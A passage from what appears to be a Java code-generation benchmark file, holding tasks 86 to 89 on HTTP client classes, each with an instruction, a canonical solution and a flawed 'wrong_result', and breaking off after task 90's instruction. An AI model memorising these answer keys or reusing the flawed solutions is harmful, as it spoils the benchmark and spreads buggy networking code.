    "wrong_result": "public String sendPostRequest(String url, String name) {\n    String responseString = \"\";\n    try {\n        URL urlObj = new URL(url);\n        HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        String body = \"name=\" + name;\n        conn.setRequestProperty(\"Content-Length\", String.valueOf(body.length()));\n        try (OutputStream os = conn.getOutputStream()) {\n            byte[] data = body.getBytes(StandardCharsets.UTF_8);\n            os.write(data);\n            os.flush();\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = in.readLine()) != null) {\n                    response.append(line);\n                }\n                responseString = response.toString();\n            }\n        } else {\n            try (BufferedReader errorIn = new BufferedReader(new InputStreamReader(conn.getErrorStream()))) {\n                StringBuilder errorResponse = new StringBuilder();\n                String errorLine;\n                while ((errorLine = errorIn.readLine()) != null) {\n                    errorResponse.append(errorLine);\n                }\n                responseString = errorResponse.toString();\n            }\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n        responseString = \"\";\n    }\n    return responseString;\n}"
  },
  {
    "Task_id": 86,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously using HttpURLConnection, with callback functionality for progress updates and post-execution results.\n\nClass Description: HttpRequestHandler is a utility class that provides asynchronous HTTP request capabilities through an inner AsyncTask class. It's designed for Android applications to perform network operations off the main thread and communicate results back through callbacks.\n\nAttributes:\n- callback: HttpRequestCallback - Interface reference for receiving progress updates and final results\n\nMethods:\n- MyAsyncTaskgetNews(HttpRequestCallback) -> Constructor - Initializes the async task with a callback interface\n- doInBackground(String...) -> String - Performs the HTTP request in the background (takes URL as input)\n- onProgressUpdate(String...) -> void - Publishes progress updates to the callback\n- onPostExecute(String) -> void - Notifies callback when execution completes\n\nInterface Methods (HttpRequestCallback):\n- onProgressUpdate(String...) -> void - Called when progress updates are available\n- onPostExecute(String) -> void - Called when the async task completes",
    "Canonical_solution": "import android.os.AsyncTask;\nimport java.io.BufferedInputStream;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public interface HttpRequestCallback {\n        void onProgressUpdate(String... progress);\n        void onPostExecute(String result);\n    }\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        private HttpRequestCallback callback;\n\n        public MyAsyncTaskgetNews(HttpRequestCallback callback) {\n            this.callback = callback;\n        }\n\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    Operations operations = new Operations(); // Context would need to be passed if needed\n                    String NewsData = operations.ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {\n                ex.printStackTrace();\n            }\n            return null;\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            if (callback != null) {\n                callback.onProgressUpdate(progress);\n            }\n        }\n\n        @Override\n        protected void onPostExecute(String result) {\n            if (callback != null) {\n                callback.onPostExecute(result);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpRequestHandler {\n    public interface HttpRequestCallback {\n        void onProgressUpdate(String... progress);\n        void onPostExecute(String result);\n    }\n\n    public class MyAsyncTask extends AsyncTask<String, String, String> {\n        private HttpRequestCallback callback;\n\n        public MyAsyncTask(HttpRequestCallback callback) {\n            this.callback = callback;\n        }\n\n        @Override\n        protected String doInBackground(String... urls) {\n            if (urls.length == 0) return null;\n            String url = urls[0];\n            try {\n                URL obj = new URL(url);\n                HttpURLConnection conn = (HttpURLConnection) obj.openConnection();\n                conn.setRequestMethod(\"GET\");\n                int responseCode = conn.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                    StringBuilder response = new StringBuilder();\n                    String inputLine;\n                    while ((inputLine = in.readLine()) != null) {\n                        response.append(inputLine);\n                    }\n                    in.close();\n                    publishProgress(\"Data received\");\n                    return response.toString();\n                } else {\n                    publishProgress(\"Error: \" + responseCode);\n                    return null;\n                }\n            } catch (Exception e) {\n                publishProgress(\"Exception: \" + e.getMessage());\n                return null;\n            }\n        }\n\n        @Override\n        protected void onProgressUpdate(String... values) {\n            if (callback != null) {\n                callback.onProgressUpdate(values);\n            }\n        }\n\n        @Override\n        protected void onPostExecute(String result) {\n            if (callback != null) {\n                callback.onPostExecute(result);\n            }\n        }\n    }\n\n    public MyAsyncTask getNews(HttpRequestCallback callback) {\n        return new MyAsyncTask(callback);\n    }\n}"
  },
  {
    "Task_id": 87,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for making network requests, with support for gzip compression, proxy interaction, and error handling.\n\nClass Description: The HttpService class provides HTTP client capabilities for making POST requests to specified endpoints. It handles request construction, connection management, response processing, and includes features like gzip compression, SSL socket configuration, proxy server interaction, and automatic retries for failed requests.\n\nAttributes:\n\nshouldGzipRequestPayload: boolean - Determines whether request payload should be gzip compressed\nMIN_UNAVAILABLE_HTTP_RESPONSE_CODE: int - Minimum HTTP response code considered as service unavailable (500)\nMAX_UNAVAILABLE_HTTP_RESPONSE_CODE: int - Maximum HTTP response code considered as service unavailable (599)\nLOGTAG: String - Tag used for logging messages\nHTTP_OUTPUT_STREAM_BUFFER_SIZE: int - Buffer size for output streams (8192 bytes)\nCONTENT_ENCODING_HEADER: String - Header key for content encoding\nGZIP_CONTENT_TYPE_HEADER: String - Value for gzip content encoding\n\nMethods:\n\nperformRequest: performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) -> byte[] - Makes an HTTP POST request to the specified endpoint with optional parameters and SSL configuration. Handles retries for failed requests and returns the response body as bytes. Throws ServiceUnavailableException for 5xx responses and IOException for other failures.\n\ngetBufferedOutputStream: getBufferedOutputStream(OutputStream out) -> OutputStream - Creates a buffered output stream, optionally wrapped in a GZIPOutputStream based on shouldGzipRequestPayload.\n\nisProxyRequest: isProxyRequest(String endpointUrl) -> boolean - Determines if the request is a proxy request by checking the endpoint URL.\n\nslurp: slurp(InputStream inputStream) -> byte[] - Reads all bytes from an input stream and returns them as a byte array.",
    "Canonical_solution": "import android.content.Context;\nimport android.net.ConnectivityManager;\nimport android.net.NetworkInfo;\nimport android.net.Uri;\n\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.zip.GZIPOutputStream;\n\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class HttpService implements RemoteService {\n\n    private final boolean shouldGzipRequestPayload;\n    private static final int MIN_UNAVAILABLE_HTTP_RESPONSE_CODE = HttpURLConnection.HTTP_INTERNAL_ERROR;\n    private static final int MAX_UNAVAILABLE_HTTP_RESPONSE_CODE = 599;\n    private static final String LOGTAG = \"MixpanelAPI.Message\";\n    private static final int HTTP_OUTPUT_STREAM_BUFFER_SIZE = 8192;\n    private static final String CONTENT_ENCODING_HEADER = \"Content-Encoding\";\n    private static final String GZIP_CONTENT_TYPE_HEADER = \"gzip\";\n\n    public HttpService(boolean shouldGzipRequestPayload) {\n        this.shouldGzipRequestPayload = shouldGzipRequestPayload;\n    }\n\n    @Override\n    public byte[] performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) throws ServiceUnavailableException, IOException {\n        MPLog.v(LOGTAG, \"Attempting request to \" + endpointUrl);\n\n        byte[] response = null;\n        int retries = 0;\n        boolean succeeded = false;\n        while (retries < 3 && !succeeded) {\n            InputStream in = null;\n            OutputStream out = null;\n            OutputStream bout = null;\n            HttpURLConnection connection = null;\n\n            try {\n                final URL url = new URL(endpointUrl);\n                connection = (HttpURLConnection) url.openConnection();\n                if (null != socketFactory && connection instanceof HttpsURLConnection) {\n                    ((HttpsURLConnection) connection).setSSLSocketFactory(socketFactory);\n                }\n\n                if (interactor != null && isProxyRequest(endpointUrl)) {\n                    Map<String,String> headers = interactor.getProxyRequestHeaders();\n                    if (headers != null) {\n                        for (Map.Entry<String, String> entry : headers.entrySet()) {\n                            connection.setRequestProperty(entry.getKey(), entry.getValue());\n                        }\n                    }\n                }\n\n                connection.setConnectTimeout(2000);\n                connection.setReadTimeout(30000);\n                if (null != params) {\n                    Uri.Builder builder = new Uri.Builder();\n                    for (Map.Entry<String, Object> param : params.entrySet()) {\n                        builder.appendQueryParameter(param.getKey(), param.getValue().toString());\n                    }\n                    String query = builder.build().getEncodedQuery();\n                    if (shouldGzipRequestPayload) {\n                        connection.setRequestProperty(CONTENT_ENCODING_HEADER, GZIP_CONTENT_TYPE_HEADER);\n                    } else {\n                        connection.setFixedLengthStreamingMode(query.getBytes().length);\n                    }\n                    connection.setDoOutput(true);\n                    connection.setRequestMethod(\"POST\");\n                    out = connection.getOutputStream();\n                    bout = getBufferedOutputStream(out);\n                    bout.write(query.getBytes(\"UTF-8\"));\n                    bout.flush();\n                    bout.close();\n                    bout = null;\n                    out.close();\n                    out = null;\n                }\n                if (interactor != null && isProxyRequest(endpointUrl)) {\n                    interactor.onProxyResponse(endpointUrl, connection.getResponseCode());\n                }\n                in = connection.getInputStream();\n                response = slurp(in);\n                in.close();\n                in = null;\n                succeeded = true;\n            } catch (final EOFException e) {\n                MPLog.d(LOGTAG, \"Failure to connect, likely caused by a known issue with Android lib. Retrying.\");\n                retries = retries + 1;\n            } catch (final IOException e) {\n                if (connection != null && connection.getResponseCode() >= MIN_UNAVAILABLE_HTTP_RESPONSE_CODE && connection.getResponseCode() <= MAX_UNAVAILABLE_HTTP_RESPONSE_CODE) {\n                    throw new ServiceUnavailableException(\"Service Unavailable\", connection.getHeaderField(\"Retry-After\"));\n                } else {\n                    throw e;\n                }\n            }\n            finally {\n                if (null != bout)\n                    try { bout.close(); } catch (final IOException e) {}\n                if (null != out)\n                    try { out.close(); } catch (final IOException e) {}\n                if (null != in)\n                    try { in.close(); } catch (final IOException e) {}\n                if (null != connection)\n                    connection.disconnect();\n            }\n        }\n        if (retries >= 3) {\n            MPLog.v(LOGTAG, \"Could not connect to Mixpanel service after three retries.\");\n        }\n        return response;\n    }\n\n    private OutputStream getBufferedOutputStream(OutputStream out) throws IOException {\n        if(shouldGzipRequestPayload) {\n          return new GZIPOutputStream(new BufferedOutputStream(out), HTTP_OUTPUT_STREAM_BUFFER_SIZE);\n        } else {\n            return new BufferedOutputStream(out);\n        }\n    }\n\n    private static boolean isProxyRequest(String endpointUrl) {\n        return !endpointUrl.toLowerCase().contains(MIXPANEL_API.toLowerCase());\n    }\n\n    private static byte[] slurp(final InputStream inputStream) throws IOException {\n        final ByteArrayOutputStream buffer = new ByteArrayOutputStream();\n        int nRead;\n        byte[] data = new byte[8192];\n\n        while ((nRead = inputStream.read(data, 0, data.length)) != -1) {\n            buffer.write(data, 0, nRead);\n        }\n\n        buffer.flush();\n        return buffer.toByteArray();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpService {\n    private static final int MAX_RETRIES = 3;\n    private final boolean shouldGzipRequestPayload;\n    private final int MIN_UNAVAILABLE_HTTP_RESPONSE_CODE = 500;\n    private final int MAX_UNAVAILABLE_HTTP_RESPONSE_CODE = 599;\n    private final String LOGTAG = \"HttpService\";\n    private final int HTTP_OUTPUT_STREAM_BUFFER_SIZE = 8192;\n    private final String CONTENT_ENCODING_HEADER = \"Content-Encoding\";\n    private final String GZIP_CONTENT_TYPE_HEADER = \"gzip\";\n\n    public static class ServiceUnavailableException extends Exception {\n        public ServiceUnavailableException(String message) {\n            super(message);\n        }\n    }\n\n    public HttpService(boolean shouldGzipRequestPayload) {\n        this.shouldGzipRequestPayload = shouldGzipRequestPayload;\n    }\n\n    public byte[] performRequest(String endpointUrl, ProxyServerInteractor interactor, Map<String, Object> params, SSLSocketFactory socketFactory) throws ServiceUnavailableException, IOException {\n        int retryCount = 0;\n        while (retryCount < MAX_RETRIES) {\n            try {\n                URL url = new URL(endpointUrl);\n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                if (isProxyRequest(endpointUrl)) {\n                    Proxy proxy = interactor.getProxy();\n                    conn.setProxy(proxy);\n                }\n                if (socketFactory != null) {\n                    conn.setSSLSocketFactory(socketFactory);\n                }\n                conn.setRequestMethod(\"POST\");\n                conn.setDoOutput(true);\n                conn.setDoInput(true);\n                conn.setUseCaches(false);\n                conn.setRequestProperty(\"Content-Type\", \"application/json\");\n                if (shouldGzipRequestPayload) {\n                    conn.setRequestProperty(CONTENT_ENCODING_HEADER, GZIP_CONTENT_TYPE_HEADER);\n                }\n\n                OutputStream out = conn.getOutputStream();\n                OutputStream bufferedOut = getBufferedOutputStream(out);\n                String jsonParams = convertParamsToJson(params);\n                bufferedOut.write(jsonParams.getBytes(\"UTF-8\"));\n                bufferedOut.close();\n                out.close();\n\n                int responseCode = conn.getResponseCode();\n                if (responseCode >= MIN_UNAVAILABLE_HTTP_RESPONSE_CODE && responseCode <= MAX_UNAVAILABLE_HTTP_RESPONSE_CODE) {\n                    throw new ServiceUnavailableException(\"Service unavailable: \" + responseCode);\n                }\n\n                return slurp(conn.getInputStream());\n            } catch (IOException e) {\n                retryCount++;\n                if (retryCount >= MAX_RETRIES) {\n                    throw e;\n                }\n            }\n        }\n        throw new IOException(\"All retries failed\");\n    }\n\n    private boolean isProxyRequest(String endpointUrl) {\n        return endpointUrl.startsWith(\"http://proxy.\");\n    }\n\n    private OutputStream getBufferedOutputStream(OutputStream out) {\n        if (shouldGzipRequestPayload) {\n            return new BufferedOutputStream(new GZIPOutputStream(out), HTTP_OUTPUT_STREAM_BUFFER_SIZE);\n        } else {\n            return new BufferedOutputStream(out, HTTP_OUTPUT_STREAM_BUFFER_SIZE);\n        }\n    }\n\n    private byte[] slurp(InputStream inputStream) throws IOException {\n        ByteArrayOutputStream result = new ByteArrayOutputStream();\n        byte[] buffer = new byte[HTTP_OUTPUT_STREAM_BUFFER_SIZE];\n        int length;\n        while ((length = inputStream.read(buffer)) != -1) {\n            result.write(buffer, 0, length);\n        }\n        return result.toByteArray();\n    }\n\n    private String convertParamsToJson(Map<String, Object> params) {\n        StringBuilder sb = new StringBuilder(\"{\");\n        boolean first = true;\n        for (Map.Entry<String, Object> entry : params.entrySet()) {\n            if (!first) {\n                sb.append(\",\");\n            }\n            sb.append(\"\\\"\").append(entry.getKey()).append(\"\\\":\\\"\");\n            Object value = entry.getValue();\n            if (value instanceof String) {\n                sb.append((String) value);\n            } else {\n                sb.append(value.toString());\n            }\n            sb.append(\"\\\"\");\n            first = false;\n        }\n        sb.append(\"}\");\n        return sb.toString();\n    }\n}"
  },
  {
    "Task_id": 88,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests and handling responses, including JSON parsing and connection management.\n\nClass Description: HttpRequester is a utility class that provides methods for creating HTTP connections, sending requests, and processing responses. It supports handling both successful responses and error streams, with specialized methods for parsing JSON responses. The class manages connection lifecycle and resource cleanup.\n\nAttributes: (None - this is a purely static utility class)\n\nMethods:\n\nMethod1: getConnectionFromRoute(String apiUrl, Route route, String... params) -> HttpURLConnection - Creates an HTTP connection from a route template and parameters. Sets up the connection with proper headers and request method.\n\nMethod2: getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) -> HttpURLConnection - Creates an HTTP connection from a pre-compiled route. Configures the connection with headers and request method.\n\nMethod3: parseInputStreamAndClose(InputStream inputStream) -> String - Internal method that reads an input stream into a string and closes the stream.\n\nMethod4: parseString(HttpURLConnection connection) -> String - Reads the successful response from a connection into a string.\n\nMethod5: parseStringAndDisconnect(HttpURLConnection connection) -> String - Reads the response into a string and disconnects the connection.\n\nMethod6: parseErrorString(HttpURLConnection connection) -> String - Reads the error stream from a connection into a string.\n\nMethod7: parseErrorStringAndDisconnect(HttpURLConnection connection) -> String - Reads the error stream into a string and disconnects the connection.\n\nMethod8: parseJSONObject(HttpURLConnection connection) -> JSONObject - Parses the response as a JSON object.\n\nMethod9: parseJSONObjectAndDisconnect(HttpURLConnection connection) -> JSONObject - Parses the response as a JSON object and disconnects the connection.\n\nMethod10: parseJSONArray(HttpURLConnection connection) -> JSONArray - Parses the response as a JSON array.\n\nMethod11: parseJSONArrayAndDisconnect(HttpURLConnection connection) -> JSONArray - Parses the response as a JSON array and disconnects the connection.",
    "Canonical_solution": "import org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequester {\n\n    public static HttpURLConnection getConnectionFromRoute(String apiUrl, Route route, String... params) throws IOException {\n        return getConnectionFromCompiledRoute(apiUrl, route.compile(params));\n    }\n\n    public static HttpURLConnection getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) throws IOException {\n        String url = apiUrl + route.getCompiledRoute();\n        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n        connection.setFixedLengthStreamingMode(0);\n        connection.setRequestMethod(route.getMethod().name());\n        String agentString = System.getProperty(\"http.agent\")\n                + \"; ReVanced/\" + Utils.getAppVersionName()\n                + \" (\" + Utils.getPatchesReleaseVersion() + \")\";\n        connection.setRequestProperty(\"User-Agent\", agentString);\n        return connection;\n    }\n\n    private static String parseInputStreamAndClose(InputStream inputStream) throws IOException {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {\n            StringBuilder jsonBuilder = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                jsonBuilder.append(line);\n                jsonBuilder.append('\\n');\n            }\n            return jsonBuilder.toString();\n        }\n    }\n\n    public static String parseString(HttpURLConnection connection) throws IOException {\n        return parseInputStreamAndClose(connection.getInputStream());\n    }\n\n    public static String parseStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static String parseErrorString(HttpURLConnection connection) throws IOException {\n        InputStream errorStream = connection.getErrorStream();\n        if (errorStream == null) {\n            return \"\";\n        }\n        return parseInputStreamAndClose(errorStream);\n    }\n\n    public static String parseErrorStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseErrorString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static JSONObject parseJSONObject(HttpURLConnection connection) throws JSONException, IOException {\n        return new JSONObject(parseString(connection));\n    }\n\n    public static JSONObject parseJSONObjectAndDisconnect(HttpURLConnection connection) throws JSONException, IOException {\n        JSONObject object = parseJSONObject(connection);\n        connection.disconnect();\n        return object;\n    }\n\n    public static JSONArray parseJSONArray(HttpURLConnection connection) throws JSONException, IOException {\n        return new JSONArray(parseString(connection));\n    }\n\n    public static JSONArray parseJSONArrayAndDisconnect(HttpURLConnection connection) throws JSONException, IOException {\n        JSONArray array = parseJSONArray(connection);\n        connection.disconnect();\n        return array;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpRequester {\n    public static HttpURLConnection getConnectionFromRoute(String apiUrl, Route route, String... params) throws IOException {\n        String fullUrl = apiUrl + route.formatPath(params);\n        HttpURLConnection conn = (HttpURLConnection) new URL(fullUrl).openConnection();\n        conn.setRequestMethod(route.getMethod().name());\n        conn.setRequestProperty(\"User-Agent\", \"HttpRequester/1.0\");\n        return conn;\n    }\n\n    public static HttpURLConnection getConnectionFromCompiledRoute(String apiUrl, Route.CompiledRoute route) throws IOException {\n        String fullUrl = apiUrl + route.getPath();\n        HttpURLConnection conn = (HttpURLConnection) new URL(fullUrl).openConnection();\n        conn.setRequestMethod(route.getMethod().name());\n        conn.setRequestProperty(\"User-Agent\", \"HttpRequester/1.0\");\n        return conn;\n    }\n\n    private static String parseInputStreamAndClose(InputStream inputStream) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            sb.append(line);\n        }\n        reader.close();\n        return sb.toString();\n    }\n\n    public static String parseString(HttpURLConnection connection) throws IOException {\n        return parseInputStreamAndClose(connection.getInputStream());\n    }\n\n    public static String parseStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static String parseErrorString(HttpURLConnection connection) throws IOException {\n        return parseInputStreamAndClose(connection.getErrorStream());\n    }\n\n    public static String parseErrorStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String result = parseErrorString(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static JSONObject parseJSONObject(HttpURLConnection connection) throws IOException, JSONException {\n        String response = parseString(connection);\n        return new JSONObject(response);\n    }\n\n    public static JSONObject parseJSONObjectAndDisconnect(HttpURLConnection connection) throws IOException, JSONException {\n        JSONObject result = parseJSONObject(connection);\n        connection.disconnect();\n        return result;\n    }\n\n    public static JSONArray parseJSONArray(HttpURLConnection connection) throws IOException, JSONException {\n        String response = parseString(connection);\n        return new JSONArray(response);\n    }\n\n    public static JSONArray parseJSONArrayAndDisconnect(HttpURLConnection connection) throws IOException, JSONException {\n        JSONArray result = parseJSONArray(connection);\n        connection.disconnect();\n        return result;\n    }\n}"
  },
  {
    "Task_id": 89,
    "Instruction": "Task Description: Create a Java class that checks the HTTP status of a given URL and provides information about the response code and any redirection.\n\nClass Description: The HttpStatusChecker class is responsible for making HTTP requests to a specified URL, checking the response status code, and providing information about the response. It handles redirections and provides human-readable messages for the status codes. The class is designed for Android applications, using Android-specific components for logging and resource management.\n\nAttributes:\n- context: Context - The Android context used for accessing resources and system services.\n- url: String - The URL to be checked for HTTP status.\n\nMethods:\n- checkStatus() -> StatusResult - Performs the HTTP request to the specified URL, checks the response code, handles redirections, and returns a StatusResult object containing the status message and redirection URL (if any). This method handles various exceptions and provides appropriate error messages.\n  \n  Nested Class:\n  - StatusResult - A static inner class that holds the result of the HTTP status check.\n    Attributes:\n    - message: String - A human-readable message describing the HTTP status or error.\n    - redirectionUrl: String - The URL to which the original URL redirects (null if no redirection).",
    "Canonical_solution": "import android.content.Context;\nimport android.util.Log;\n\nimport com.trianguloy.urlchecker.utilities.methods.HttpUtils;\n\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpStatusChecker {\n\n    private final Context context;\n    private final String url;\n\n    public HttpStatusChecker(Context context, String url) {\n        this.context = context;\n        this.url = url;\n    }\n\n    public StatusResult checkStatus() {\n        String message = null;\n        String redirectionUrl = null;\n\n        HttpURLConnection conn = null;\n        try {\n            // Step 2: Get the access URL\n            Log.d(\"STATUS\", \"Checking: \" + url);\n            \n            // Step 3: Create an HttpURLConnection object\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            \n            // Step 4: Set request parameters\n            conn.setInstanceFollowRedirects(false);\n            conn.setConnectTimeout(HttpUtils.CONNECT_TIMEOUT);\n            \n            // Step 5: Processing Input and Output\n            var responseCode = conn.getResponseCode();\n            Log.d(\"RESPONSE_CODE\", url + \": \" + responseCode);\n\n            var codesArray = context.getResources().getStringArray(R.array.mStatus_codes);\n            for (var s : codesArray) {\n                if (s.startsWith(String.valueOf(responseCode))) {\n                    message = s;\n                    break;\n                }\n            }\n            if (message == null) {\n                message = context.getString(R.string.mStatus_unknownCode, responseCode);\n            }\n\n            var location = conn.getHeaderField(\"Location\");\n            if (location != null) {\n                redirectionUrl = new URL(new URL(url), location).toExternalForm();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            message = context.getString(R.string.mStatus_ioerror, e.getMessage());\n        } catch (Exception e) {\n            e.printStackTrace();\n            message = context.getString(R.string.mStatus_error, e.getMessage());\n        } finally {\n            // Step 6: Disconnect\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n\n        return new StatusResult(message, redirectionUrl);\n    }\n\n    public static class StatusResult {\n        public final String message;\n        public final String redirectionUrl;\n\n        public StatusResult(String message, String redirectionUrl) {\n            this.message = message;\n            this.redirectionUrl = redirectionUrl;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpStatusChecker {\n    private Context context;\n    private String url;\n\n    public HttpStatusChecker(Context context, String url) {\n        this.context = context;\n        this.url = url;\n    }\n\n    public StatusResult checkStatus() {\n        StatusResult result = new StatusResult();\n        try {\n            String currentUrl = url;\n            String redirectionUrl = null;\n            while (true) {\n                URL urlObj = new URL(currentUrl);\n                HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n                conn.setRequestMethod(\"GET\");\n                conn.setInstanceFollowRedirects(false);\n                int responseCode = conn.getResponseCode();\n                if (responseCode >= 300 && responseCode < 400) {\n                    String location = conn.getHeaderField(\"Location\");\n                    if (location != null) {\n                        redirectionUrl = location;\n                        currentUrl = location;\n                    } else {\n                        throw new IOException(\"Redirect without Location header\");\n                    }\n                } else {\n                    break;\n                }\n            }\n            URL finalUrlObj = new URL(currentUrl);\n            HttpURLConnection finalConn = (HttpURLConnection) finalUrlObj.openConnection();\n            finalConn.setRequestMethod(\"GET\");\n            int finalResponseCode = finalConn.getResponseCode();\n            String message = getHumanReadableMessage(finalResponseCode);\n            result.message = message;\n            result.redirectionUrl = redirectionUrl;\n        } catch (IOException e) {\n            result.message = \"Error: \" + e.getMessage();\n            result.redirectionUrl = null;\n        }\n        return result;\n    }\n\n    private String getHumanReadableMessage(int code) {\n        switch (code) {\n            case 200: return \"OK\";\n            case 201: return \"Created\";\n            case 202: return \"Accepted\";\n            case 203: return \"Non Authoritative Information\";\n            case 204: return \"No Content\";\n            case 205: return \"Reset Content\";\n            case 206: return \"Partial Content\";\n            case 300: return \"Multiple Choices\";\n            case 301: return \"Moved Permanently\";\n            case 302: return \"Found\";\n            case 303: return \"See Other\";\n            case 304: return \"Not Modified\";\n            case 305: return \"Use Proxy\";\n            case 306: return \"Switch Proxy\";\n            case 307: return \"Temporary Redirect\";\n            case 400: return \"Bad Request\";\n            case 401: return \"Unauthorized\";\n            case 402: return \"Payment Required\";\n            case 403: return \"Forbidden\";\n            case 404: return \"Not Found\";\n            case 405: return \"Method Not Allowed\";\n            case 406: return \"Not Acceptable\";\n            case 407: return \"Proxy Authentication Required\";\n            case 408: return \"Request Timeout\";\n            case 409: return \"Conflict\";\n            case 410: return \"Gone\";\n            case 411: return \"Length Required\";\n            case 412: return \"Precondition Failed\";\n            case 413: return \"Request Entity Too Large\";\n            case 414: return \"Request-URI Too Long\";\n            case 415: return \"Unsupported Media Type\";\n            case 416: return \"Requested Range Not Satisfiable\";\n            case 417: return \"Expectation Failed\";\n            case 500: return \"Internal Server Error\";\n            case 501: return \"Not Implemented\";\n            case 502: return \"Bad Gateway\";\n            case 503: return \"Service Unavailable\";\n            case 504: return \"Gateway Timeout\";\n            case 505: return \"HTTP Version Not Supported\";\n            default: return \"Unknown status code \" + code;\n        }\n    }\n\n    public static class StatusResult {\n        public String message;\n        public String redirectionUrl;\n    }\n}"
  },
  {
    "Task_id": 90,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests using HttpURLConnection, supporting both GET and POST methods asynchronously, with callback mechanisms for handling responses and errors. The class should also include functionality to retrieve network time from a server.\n\nClass Description: HttpURLConnectionUtils is a utility class that provides asynchronous HTTP request capabilities using Java's HttpURLConnection. It supports GET and POST methods, allows setting custom headers, and provides callback interfaces for handling responses and errors. Additionally, it includes functionality to fetch network time from a specified URL.\n\nAttributes:\n- TAG: String - Class tag for logging purposes\n- TIMEOUT_IN_MILLIONS: int - Default timeout for connections in milliseconds (5000ms)\n- BAIDU_URL: String - Default URL for network time requests (https://www.baidu.com)\n\nMethods:\n- doGetAsync(String urlStr, Callback callback) -> void - Performs an asynchronous GET request to the specified URL and invokes the callback with the response or error\n- doPostAsync(String urlStr, String params, Callback callback) -> void - Performs an asynchronous POST request to the specified URL with given parameters and invokes the callback\n- getNetTime(TimeCallback callback) -> void - Retrieves network time from the default BAIDU_URL using the provided callback\n- getNetTime(String urlStr, TimeCallback callback) -> void - Retrieves network time from the specified URL using the provided callback\n- request(String method, String urlStr, Map<String,String> headers, String params, Callback callback) -> void - Internal method that handles the actual HTTP request logic\n- reqNetTime(String urlStr, TimeCallback callback) -> void - Internal method that handles network time retrieval\n\nCallback Interfaces:\n- Callback: \n  - onResponse(String result, long response) -> void - Called when request succeeds\n  - onFail(Throwable error) -> void - Called when request fails\n- TimeCallback:\n  - onResponse(long millis) -> void - Called when network time retrieval succeeds\n  - onFail(Throwable error) -> void - Called when network time retrieval fails",
